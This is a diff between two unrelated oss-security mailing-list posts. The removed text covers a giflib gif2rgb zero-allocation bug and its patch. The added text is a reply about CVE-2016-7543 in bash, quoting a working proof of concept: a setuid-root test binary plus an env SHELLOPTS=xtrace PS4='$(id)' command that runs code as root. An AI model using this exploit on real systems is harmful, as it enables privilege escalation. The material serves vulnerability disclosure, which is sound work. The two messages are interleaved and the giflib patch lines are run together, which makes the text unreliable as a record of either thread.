@@ -1,76 +1,33 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/29/1
-Message-ID: <4e14191f.1337.1528a79fc07.Coremail.xiaoqixue_1@163.com>
-Date: Fri, 29 Jan 2016 07:03:16 +0800 (CST)
-From: xiaoqixue_1  <xiaoqixue_1@....com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/27/2
+Message-ID: <mpro.oe4vxq069usvx05jg.taviso@cmpxchg8b.com>
+Date: Mon, 26 Sep 2016 16:01:03 -0700
+From: Tavis Ormandy <taviso@...xchg8b.com>
 To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: Re:Re: a bug in gif2rgb.c in giflib-5.1.2
+Subject: Re: CVE-2016-7543 -- bash SHELLOPTS+PS4
 Content-Type: text/plain; charset=utf-8
 
+up201407890@...nos.dcc.fc.up.pt wrote:
 
+> The recent bash 4.4 patched an old attack vector regarding specially
+> crafted SHELLOPTS+PS4 environment variables against bogus setuid binaries
+> using system()/popen().
+> 
+> https://lists.gnu.org/archive/html/bug-bash/2016-09/msg00018.html
+> 
+> "nn. Shells running as root no longer inherit PS4 from the environment,
+> closing a security hole involving PS4 expansion performing command
+> substitution."
+> 
+> # gcc -xc - -otest <<< 'int main() { setuid(0); system("/bin/date"); }' #
+> chmod 4755 ./test # ls -l ./test -rwsr-xr-x. 1 root root 8549 Sep 10 18:06
+> ./test # exit $ env -i SHELLOPTS=xtrace PS4='$(id)' ./test uid=0(root) Sat
+> Sep 10 18:06:36 WET 2016
+> 
+> Sorry Tavis :P
+> 
 
-It has been fixed now.
+Hah, nice work :-)
 
-GifFile->SHeight and GifFile->SWidth both could result to zero memory allocation actually.
-the patch as follows:
-http://sourceforge.net/p/giflib/code/ci/4cc68b315ff9a378aef6664e1be6b2144ad4a5e6/#diff-2
+Tavis.
 
---- a/util/gif2rgb.c+++ b/util/gif2rgb.c@@ -378,8 +378,8 @@
- 	}
-     }
- 
--    if (GifFile->SHeight == 0) {-	fprintf(stderr, "Image of height 0\n");+    if (GifFile->SHeight == 0 || GifFile->SWidth == 0) {+	fprintf(stderr, "Image of width or height 0\n");
- 	exit(EXIT_FAILURE);
-     }
-
-
-
-
-
-
-
-At 2016-01-27 13:40:08, cve-assign@...re.org wrote:
->-----BEGIN PGP SIGNED MESSAGE-----
->Hash: SHA256
->
->> We find a memory allocation whose size could be zero in gif2rgb.c.
->> and It will result to several memory out of bound read and write. the bug in gif2rgb.c:386 :
->> 
->> 386 if ((ScreenBuffer = (GifRowType *) 
->> 387 malloc(GifFile->SHeight * sizeof(GifRowType))) == NULL) 
->> 388 GIF_EXIT("Failed to allocate memory required, aborted.");
->> 
->> 
->> Please see "http://sourceforge.net/p/giflib/bugs/82/" for more details.
->
->Can you provide more information about the relationship between
->http://sourceforge.net/p/giflib/bugs/82/ and the above instance of
->GifFile->SHeight in the malloc call? The
->http://sourceforge.net/p/giflib/code/ci/4cc68b315ff9a378aef6664e1be6b2144ad4a5e6/
->patch for http://sourceforge.net/p/giflib/bugs/82/ adds a check for
->"GifFile->SWidth == 0" but does not add new validation of the
->GifFile->SHeight value.
->
->- -- 
->CVE assignment team, MITRE CVE Numbering Authority
->M/S M300
->202 Burlington Road, Bedford, MA 01730 USA
->[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
->-----BEGIN PGP SIGNATURE-----
->Version: GnuPG v1
->
->iQIcBAEBCAAGBQJWqFekAAoJEL54rhJi8gl5AtQP/imjqKTZMrt2KiqYaIAiEbvK
->KBvoKNDaBesh4kJQ2XHIlT+kG5y2Qr0KiXYR3+O0nrbebXzM9pUlcAI6H3jAhiOX
->h2mRNBXKGOof7wbsoAFsKrYEKAdASvLxy+KSl74Bxb00Z68PSezgBo1SoHi/xW3z
->C5yFxRnOjYLlVz/X76+gYYqbLgwnLHUPWN4mIxu2unDZ67Mc43i8br4pr1eXH4an
->1GgExNhoMsIk2vwPLatOL7DDEqBJKLygVh5QYtXs1uXjBx/RA4opzJRsb3mgmX2D
->K4q5mjgrUfx85meR/9zBVs22HLSWcJPQoqQnaRHcKKN0R8J0P+31X2NYBqbMj9d3
->HVZaaX9zB4Uq3Mpj9ZTgGnvyJuI/YVi7VviYTWhn17NGrvH3ivCr/vvhs7nudBti
->PfQj6if3vhy6cH7WYUN9ybzG3NXFdPpL9ZU5WN5GAyICXfYo3m63X03OZWPuTm3h
->skzp2a4dAfh+6KTF53ebUzoi0V+vX3tq5+jnMbDam/UfZBOdq+cK0CYU2VrOmNCj
->F0LcBDjzGBxepVLQS54Bvh/B5ymrIWjcub4zJ6gIIh0Sg5sUBBW2eg80my5wrD46
->7mvpMgl2D2FWy8dHkdyf4abotfnZj62d43XD+tqjfERuTRnJCDNh/O8q4MyMVw73
->69PiDuGJuPAhFns58FDN
->=bNmf
->-----END PGP SIGNATURE-----
